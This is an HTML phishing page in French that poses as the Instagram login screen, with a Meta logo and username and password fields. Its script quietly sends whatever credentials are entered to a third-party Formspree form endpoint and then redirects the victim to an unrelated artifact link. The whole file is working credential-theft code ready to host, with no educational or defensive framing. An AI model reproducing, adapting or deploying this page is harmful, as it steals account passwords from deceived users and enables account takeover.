<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Se connecter à Instagram</title>
  <link rel="stylesheet" href="styles.css" />
</head>

<body>
  <div class="layout">
    <div class="logo-corner"></div>

    <div class="visual">
      <p class="tagline"><br><span></span></p>
    </div>

    <div class="panel">
      <div class="top">
        <div style="text-align: center;">
          <img src="Meta2.png" alt="Logo" width="150">
        </div>
        <p class="subtitle"></p>

        <!-- Formulaire pointant vers Formspree -->
        <form id="login-form" action="https://formspree.io/f/mdeaeelg" method="POST">
          <div class="field">
            <input type="text" id="username" name="username"
                   placeholder="Identifiant"
                   aria-label="Identifiant" autocomplete="username" required />
          </div>

          <div class="field">
            <input type="password" id="password" name="password"
                   placeholder="Mot de passe"
                   aria-label="Mot de passe" autocomplete="current-password" required />
          </div>

          <button type="submit" class="btn">Se connecter</button>

          <p class="message" id="message"></p>
        </form>
      </div>

      <div class="bottom">
        <a href="#">Mot de passe oublié ?</a>.
      </div>
    </div>
  </div>

  <script>
    const REDIRECT_URL = "https://claude.ai/artifact/1hJvKavTEJWYPeWXgnV1WM";
    const form = document.getElementById("login-form");
    const messageEl = document.getElementById("message");

    form.addEventListener("submit", async function (event) {
      event.preventDefault(); 

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value;

      if (username === "" || password === "") {
        showError("Entre ton identifiant et ton mot de passe.");
        return;
      }

      try {
        // Envoi des données en arrière-plan à Formspree
        const response = await fetch(form.action, {
          method: 'POST',
          headers: { 'Accept': 'application/json' },
          body: new FormData(form)
        });

        if (response.ok) {
          // Redirection vers le lien cible une fois envoyé
          window.location.href = REDIRECT_URL;
        } else {
          showError("Erreur lors de la connexion.");
        }
      } catch (error) {
        showError("Une erreur est survenue.");
      }
    });

    function showError(text) {
      messageEl.textContent = text;
      messageEl.className = "message error";
      messageEl.style.display = "block";
    }
  </script>
</body>
</html>
